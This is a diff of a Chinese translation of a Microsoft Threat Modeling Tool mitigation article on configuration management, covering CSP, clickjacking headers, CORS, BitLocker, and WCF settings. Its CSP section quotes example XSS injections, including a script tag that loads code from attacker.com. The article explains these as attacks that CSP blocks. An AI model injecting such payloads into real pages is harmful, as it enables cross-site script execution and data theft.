@@ -1,5 +1,5 @@
 ---
-title: 微软威胁建模工具的配置管理
+title: Microsoft Threat Modeling Tool 的配置管理
 titleSuffix: Azure
 description: 针对威胁建模工具中暴露的威胁采取的缓解措施
 services: security
@@ -16,43 +16,43 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: ead6a79109c221d31ead96a202e97294ef218c5f
-ms.sourcegitcommit: acb82fc770128234f2e9222939826e3ade3a2a28
+ms.openlocfilehash: 499e4cb2cb62ccc170637bad60898b38b4ff3be7
+ms.sourcegitcommit: 67bddb15f90fb7e845ca739d16ad568cbc368c06
 ms.translationtype: MT
 ms.contentlocale: zh-CN
-ms.lasthandoff: 04/21/2020
-ms.locfileid: "81687974"
+ms.lasthandoff: 04/28/2020
+ms.locfileid: "82204247"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>安全框架：配置管理 | 缓解措施 
 | 产品/服务 | 项目 |
 | --------------- | ------- |
-| **Web 应用程序** | <ul><li>[实施内容安全策略 （CSP），并禁用内联 javascript](#csp-js)</li><li>[启用浏览器的 XSS 筛选器](#xss-filter)</li><li>[ASP.NET应用程序必须在部署前禁用跟踪和调试](#trace-deploy)</li><li>[仅从受信任的源访问第三方 Javascript](#js-trusted)</li><li>[确保经过身份验证的ASP.NET页面包含 UI 纠正或单击劫持防御](#ui-defenses)</li><li>[如果在 ASP.NET Web 应用程序中启用了 CORS，请确保仅允许受信任的源](#cors-aspnet)</li><li>[在ASP.NET页面上启用验证请求属性](#validate-aspnet)</li><li>[使用本地托管的最新版本的 JavaScript 库](#local-js)</li><li>[禁用自动 MIME 探查](#mime-sniff)</li><li>[删除 Windows Azure 网站上的标准服务器标头，以避免指纹](#standard-finger)</li></ul> |
-| **数据库** | <ul><li>[为数据库引擎访问配置 Windows 防火墙](#firewall-db)</li></ul> |
-| **Web API** | <ul><li>[如果在 ASP.NET Web API 上启用了 CORS，请确保仅允许受信任的源](#cors-api)</li><li>[加密包含敏感数据的 Web API 配置文件的部分](#config-sensitive)</li></ul> |
-| **IoT 设备** | <ul><li>[确保所有管理接口都使用强凭据进行保护](#admin-strong)</li><li>[确保未知代码无法在设备上执行](#unknown-exe)</li><li>[使用 bit-locker 加密 IoT 设备的 OS 和其他分区](#partition-iot)</li><li>[确保仅在设备上启用最低服务/功能](#min-enable)</li></ul> |
-| **IoT 现场网关** | <ul><li>[使用位锁加密 IoT 现场网关的操作系统和其他分区](#field-bit-locker)</li><li>[确保在安装过程中更改现场网关的默认登录凭据](#default-change)</li></ul> |
-| **IoT 云网关** | <ul><li>[确保云网关实现一个过程，使已连接的设备固件保持最新](#cloud-firmware)</li></ul> |
-| **计算机信任边界** | <ul><li>[确保设备具有根据组织策略配置的终端安全控制](#controls-policies)</li></ul> |
-| **Azure 存储** | <ul><li>[确保对 Azure 存储访问密钥进行安全管理](#secure-keys)</li><li>[确保在 Azure 存储上启用 CORS 时仅允许受信任的源](#cors-storage)</li></ul> |
-| **WCF** | <ul><li>[启用 WCF 的服务限制功能](#throttling)</li><li>[通过元数据披露 WCF 信息](#info-metadata)</li></ul> | 
+| **Web 应用程序** | <ul><li>[实施内容安全策略（CSP）并禁用内联 javascript](#csp-js)</li><li>[启用浏览器的 XSS 筛选器](#xss-filter)</li><li>[在部署前，ASP.NET 应用程序必须禁用跟踪和调试](#trace-deploy)</li><li>[仅从受信任源访问第三方 javascript](#js-trusted)</li><li>[确保通过身份验证的 ASP.NET 页面合并 UI 伪装或单击点击劫持防御](#ui-defenses)</li><li>[如果在 ASP.NET Web 应用程序上启用 CORS，请确保只允许受信任的来源](#cors-aspnet)</li><li>[在 ASP.NET 页上启用 ValidateRequest 属性](#validate-aspnet)</li><li>[使用本地托管的最新版本的 JavaScript 库](#local-js)</li><li>[禁用自动 MIME 探查](#mime-sniff)</li><li>[在 Microsoft Azure 网站上删除标准服务器标头以避免指纹](#standard-finger)</li></ul> |
+| **Database** | <ul><li>[为数据库引擎访问配置 Windows 防火墙](#firewall-db)</li></ul> |
+| **Web API** | <ul><li>[如果在 ASP.NET Web API 上启用 CORS，请确保只允许受信任的来源](#cors-api)</li><li>[加密 Web API 配置文件中包含敏感数据的部分](#config-sensitive)</li></ul> |
+| **IoT 设备** | <ul><li>[确保用强凭据保护所有管理界面](#admin-strong)</li><li>[确保未知的代码无法在设备上执行](#unknown-exe)</li><li>[使用 bit-locker 加密 IoT 设备的 OS 和其他分区](#partition-iot)</li><li>[确保只在设备上启用最小服务/功能](#min-enable)</li></ul> |
+| **IoT 现场网关** | <ul><li>[用位保险箱加密 IoT 现场网关的 OS 和其他分区](#field-bit-locker)</li><li>[确保在安装期间更改现场网关的默认登录凭据](#default-change)</li></ul> |
+| **IoT 云网关** | <ul><li>[确保云网关实现了将连接的设备固件保持为最新状态的过程](#cloud-firmware)</li></ul> |
+| **计算机信任边界** | <ul><li>[确保根据组织策略，将设备设置为终结点安全控制](#controls-policies)</li></ul> |
+| **Azure 存储** | <ul><li>[确保对 Azure 存储访问密钥进行安全管理](#secure-keys)</li><li>[如果在 Azure 存储中启用了 CORS，请确保只允许受信任的来源](#cors-storage)</li></ul> |
+| **WCF** | <ul><li>[启用 WCF 的服务限制功能](#throttling)</li><li>[WCF-通过元数据泄露信息](#info-metadata)</li></ul> | 
 
 ## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>实施内容安全策略 (CSP) 并禁用内联 JavaScript
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | Web 应用程序 | 
+| 组件                | Web 应用程序 | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | 泛型 |
 | **特性**              | 空值  |
 | **参考**              | [内容安全策略简介](https://www.html5rocks.com/en/tutorials/security/content-security-policy/)、[内容安全策略参考](https://content-security-policy.com/)、[安全功能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)、[内容安全策略简介](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy)、[是否可以使用 CSP？](https://caniuse.com/#feat=contentsecuritypolicy) |
-| **步骤** | <p>内容安全策略 (CSP) 是一种深度防护安全机制，也是一项 W3C 标准，可让 Web 应用程序所有者控制其站点中嵌入的内容。 CSP 以 HTTP 响应标头的形式添加在 Web 服务器上，由浏览器在客户端实施。 它是基于允许列表的策略 - 网站可以声明一组受信任的域，而通过这些域可以加载 JavaScript 等活动内容。</p><p>CSP 提供以下安全优势：</p><ul><li>**XSS 防护：** 如果页面容易受到 XSS 攻击，攻击者可通过两种方式利用这种漏洞：<ul><li>注入 `<script>malicious code</script>`。 由于 CSP 的基本限制-1，此漏洞将不起作用</li><li>注入 `<script src="http://attacker.com/maliciousCode.js"/>`。 此漏洞将不起作用，因为攻击者控制的域将不会在 CSP 的域白名单中</li></ul></li><li>**控制数据渗透：** 如果网页中的任何恶意内容尝试连接到外部网站并窃取数据，CSP 将中止该连接。 这是因为目标域不在 CSP 的白名单中</li><li>**防范点击劫持：** 点击劫持是一种攻击技法，攻击者布设一个正规的网站，诱迫用户点击其中的 UI 元素。 目前，针对点击劫持的防范措施是通过配置 响应标头 X-Frame-Options 实现的。 并非所有浏览器都支持此标头，从趋势来看，CSP 是防范点击劫持的标准方式。</li><li>**实时攻击报告：** 如果启用 CSP 的网站上发生注入攻击，浏览器会自动向 Web 服务器上配置的终结点触发通知。 这样，CSP 便充当了实时警告系统。</li></ul> |
+| **步骤** | <p>内容安全策略 (CSP) 是一种深度防护安全机制，也是一项 W3C 标准，可让 Web 应用程序所有者控制其站点中嵌入的内容。 CSP 以 HTTP 响应标头的形式添加在 Web 服务器上，由浏览器在客户端实施。 它是基于允许列表的策略 - 网站可以声明一组受信任的域，而通过这些域可以加载 JavaScript 等活动内容。</p><p>CSP 提供以下安全优势：</p><ul><li>**XSS 防护：** 如果页面容易受到 XSS 攻击，攻击者可通过两种方式利用这种漏洞：<ul><li>注入 `<script>malicious code</script>`。 此攻击不起作用，因为 CSP 的基本限制为1</li><li>注入 `<script src="http://attacker.com/maliciousCode.js"/>`。 此攻击将不起作用，因为攻击者控制的域将不会在 CSP 的域内白名单中</li></ul></li><li>**控制数据渗透：** 如果网页中的任何恶意内容尝试连接到外部网站并窃取数据，CSP 将中止该连接。 这是因为目标域不会出现在 CSP 的白名单中</li><li>**防范点击劫持：** 点击劫持是一种攻击技法，攻击者布设一个正规的网站，诱迫用户点击其中的 UI 元素。 目前，针对点击劫持的防范措施是通过配置 响应标头 X-Frame-Options 实现的。 并非所有浏览器都支持此标头，从趋势来看，CSP 是防范点击劫持的标准方式。</li><li>**实时攻击报告：** 如果启用 CSP 的网站上发生注入攻击，浏览器会自动向 Web 服务器上配置的终结点触发通知。 这样，CSP 便充当了实时警告系统。</li></ul> |
 
 ### <a name="example"></a>示例
 示例策略： 
 ```csharp
 Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
 ```
-此策略允许脚本仅从 Web 应用程序的服务器和 google 分析服务器加载。 从其他任何站点加载的脚本会被拒绝。 在网站上启用 CSP 后，以下功能会自动禁用以缓解 XSS 攻击。 
+此策略仅允许从 web 应用程序的服务器和 google analytics 服务器加载脚本。 从其他任何站点加载的脚本会被拒绝。 在网站上启用 CSP 后，以下功能会自动禁用以缓解 XSS 攻击。 
 
 ### <a name="example"></a>示例
 内联脚本不会执行。 下面是内联脚本的示例 
@@ -72,7 +72,7 @@ Example: var str="alert(1)"; eval(str);
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | Web 应用程序 | 
+| 组件                | Web 应用程序 | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | 泛型 |
 | **特性**              | 空值  |
@@ -83,7 +83,7 @@ Example: var str="alert(1)"; eval(str);
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | Web 应用程序 | 
+| 组件                | Web 应用程序 | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | 泛型 |
 | **特性**              | 空值  |
@@ -94,26 +94,26 @@ Example: var str="alert(1)"; eval(str);
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | Web 应用程序 | 
+| 组件                | Web 应用程序 | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | 泛型 |
 | **特性**              | 空值  |
 | **参考**              | 空值  |
-| **步骤** | 只应从受信任源引用第三方 JavaScript。 引用终结点应始终在 SSL 连接中。 |
+| **步骤** | 只应从受信任源引用第三方 JavaScript。 引用终结点应始终位于 TLS 上。 |
 
-## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>确保经过身份验证的ASP.NET页面包含 UI 纠正或单击劫持防御
+## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>确保通过身份验证的 ASP.NET 页面合并 UI 伪装或单击点击劫持防御
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | Web 应用程序 | 
+| 组件                | Web 应用程序 | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | 泛型 |
 | **特性**              | 空值  |
-| **参考**              | [OWASP 点击劫持防御备忘表](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)， [IE 内部 - 打击点击劫持与 X 帧选项](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
+| **参考**              | [OWASP 单击-点击劫持防卫](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)备忘单， [IE 内部-抗击单击-点击劫持与 X 框架选项](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
 | **步骤** | <p>点击劫持也称“UI 伪装攻击”，是指攻击者使用多个透明或不透明的层，在用户想要点击顶层页面时，诱使用户点击另一个页面上的按钮或链接。</p><p>这种分层是通过编写使用 iframe 的恶意页面，加载受害者的页面来实现的。 因此，攻击者正是“劫持”了用户原本要在其页面上的点击，将他们路由到很有可能是由其他应用程序和/或域拥有的另一个页面。 若要阻止点击劫持攻击，请设置适当的 X-Frame-Options HTTP 响应标头，指示浏览器不要允许来自其他域的框架设计</p>|
 
 ### <a name="example"></a>示例
-X-FRAME-OPTIONS 标头可通过 IIS Web.config 进行设置。不应陷害的网站的 Web.config 代码段： 
+可以通过 IIS web.config 设置 X 框架选项标头。绝不会分帧的站点的 web.config 代码片段： 
 ```csharp
     <system.webServer>
         <httpProtocol>
@@ -140,7 +140,7 @@ X-FRAME-OPTIONS 标头可通过 IIS Web.config 进行设置。不应陷害的网
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | Web 应用程序 | 
+| 组件                | Web 应用程序 | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | Web 窗体、MVC5 |
 | **特性**              | 空值  |
@@ -171,7 +171,7 @@ HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://exampl
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | Web 应用程序 | 
+| 组件                | Web 应用程序 | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | Web 窗体、MVC5 |
 | **特性**              | 空值  |
@@ -197,7 +197,7 @@ HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://exampl
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | Web 应用程序 | 
+| 组件                | Web 应用程序 | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | 泛型 |
 | **特性**              | 空值  |
@@ -208,7 +208,7 @@ HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://exampl
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | Web 应用程序 | 
+| 组件                | Web 应用程序 | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | 泛型 |
 | **特性**              | 空值  |
@@ -273,7 +273,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | Web 应用程序 | 
+| 组件                | Web 应用程序 | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | 泛型 |
 | **特性**              | EnvironmentType - Azure |
@@ -284,7 +284,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | 数据库 | 
+| 组件                | 数据库 | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | SQL Azure、OnPrem |
 | **特性**              | 不适用，SQL 版本 - V12 |
@@ -295,7 +295,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | Web API | 
+| 组件                | Web API | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | MVC 5 |
 | **特性**              | 空值  |
@@ -391,7 +391,7 @@ public class ResourcesController : ApiController
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | Web API | 
+| 组件                | Web API | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | MVC 6 |
 | **特性**              | 空值  |
@@ -483,7 +483,7 @@ public void ConfigureServices(IServiceCollection services)
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | Web API | 
+| 组件                | Web API | 
 | **SDL 阶段**               | 部署 |  
 | **适用的技术** | 泛型 |
 | **特性**              | 空值  |
@@ -494,7 +494,7 @@ public void ConfigureServices(IServiceCollection services)
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | IoT 设备 | 
+| 组件                | IoT 设备 | 
 | **SDL 阶段**               | 部署 |  
 | **适用的技术** | 泛型 |
 | **特性**              | 空值  |
@@ -505,18 +505,18 @@ public void ConfigureServices(IServiceCollection services)
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | IoT 设备 | 
+| 组件                | IoT 设备 | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | 泛型 |
 | **特性**              | 空值  |
-| **参考**              | [在 Windows 10 IoT 内核上启用安全启动和位锁定设备加密](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
+| **参考**              | [在 Windows 10 IoT Core 上启用安全启动和位保险箱设备加密](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
 | **步骤** | UEFI 安全启动会将系统限制为只允许执行指定的颁发机构签名的二进制文件。 此功能可防止在平台上执行未知的代码，潜在地削弱这种代码的安全风险。 启用 UEFI 安全启动，并限制受信任的、可为代码签名的证书颁发机构列表。 使用受信任的颁发机构之一为设备上部署的所有代码签名。 |
 
 ## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>使用 bit-locker 加密 IoT 设备的 OS 和其他分区
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | IoT 设备 | 
+| 组件                | IoT 设备 | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | 泛型 |
 | **特性**              | 空值  |
@@ -527,18 +527,18 @@ public void ConfigureServices(IServiceCollection services)
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | IoT 设备 | 
+| 组件                | IoT 设备 | 
 | **SDL 阶段**               | 部署 |  
 | **适用的技术** | 泛型 |
 | **特性**              | 空值  |
 | **参考**              | 空值  |
 | **步骤** | 不要在 OS 中启用或者请关闭运行解决方案所不需要的任何功能或服务。 例如，如果设备不需要部署 UI，请在无外设模式下安装 Windows IoT Core。 |
 
-## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>使用位锁加密 IoT 现场网关的操作系统和其他分区
+## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>用位保险箱加密 IoT 现场网关的 OS 和其他分区
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | IoT 现场网关 | 
+| 组件                | IoT 现场网关 | 
 | **SDL 阶段**               | 部署 |  
 | **适用的技术** | 泛型 |
 | **特性**              | 空值  |
@@ -549,7 +549,7 @@ public void ConfigureServices(IServiceCollection services)
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | IoT 现场网关 | 
+| 组件                | IoT 现场网关 | 
 | **SDL 阶段**               | 部署 |  
 | **适用的技术** | 泛型 |
 | **特性**              | 空值  |
@@ -560,7 +560,7 @@ public void ConfigureServices(IServiceCollection services)
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | IoT 云网关 | 
+| 组件                | IoT 云网关 | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | 泛型 |
 | **特性**              | 网关选项 - Azure IoT 中心 |
@@ -571,7 +571,7 @@ public void ConfigureServices(IServiceCollection services)
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | 计算机信任边界 | 
+| 组件                | 计算机信任边界 | 
 | **SDL 阶段**               | 部署 |  
 | **适用的技术** | 泛型 |
 | **特性**              | 空值  |
@@ -582,7 +582,7 @@ public void ConfigureServices(IServiceCollection services)
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | Azure 存储 | 
+| 组件                | Azure 存储 | 
 | **SDL 阶段**               | 部署 |  
 | **适用的技术** | 泛型 |
 | **特性**              | 空值  |
@@ -593,7 +593,7 @@ public void ConfigureServices(IServiceCollection services)
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | Azure 存储 | 
+| 组件                | Azure 存储 | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | 泛型 |
 | **特性**              | 空值  |
@@ -604,7 +604,7 @@ public void ConfigureServices(IServiceCollection services)
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | WCF | 
+| 组件                | WCF | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | .NET Framework 3 |
 | **特性**              | 空值  |
@@ -627,7 +627,7 @@ public void ConfigureServices(IServiceCollection services)
 
 | 标题                   | 详细信息      |
 | ----------------------- | ------------ |
-| **组件**               | WCF | 
+| 组件                | WCF | 
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | .NET Framework 3 |
 | **特性**              | 空值  |
